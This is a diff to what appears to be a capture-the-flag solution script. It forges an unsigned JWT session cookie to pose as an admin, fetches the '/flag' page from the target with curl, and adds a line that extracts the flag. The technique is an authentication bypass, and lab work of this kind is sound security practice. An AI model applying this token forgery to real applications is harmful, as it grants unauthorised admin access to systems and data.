@@ -52,8 +52,7 @@ UNSIGNED_TOKEN="$ENCODED_HEADER.$ENCODED_PAYLOAD."
 echo "--> Token modified : $UNSIGNED_TOKEN"
 awk -v new_jwt="$UNSIGNED_TOKEN" 'BEGIN {OFS="\t"} {if ($6 == "jwt-session") $7 = new_jwt; print}' "/work/8-cookies.txt" > tmp && mv tmp "/work/8-cookies-admin.txt"
 
-
 # Gather secret data
 echo "2.4 - GATHER ADMIN DATA"
 curl -s -X GET "http://$target_ip:8089/flag" -L -b /work/8-cookies-admin.txt -o /work/8-admin.html
-
+echo "--> Flag is : $(sed -n 's/.*to\(.*\)<\/p>.*/\1/p' /work/8-admin.html)"
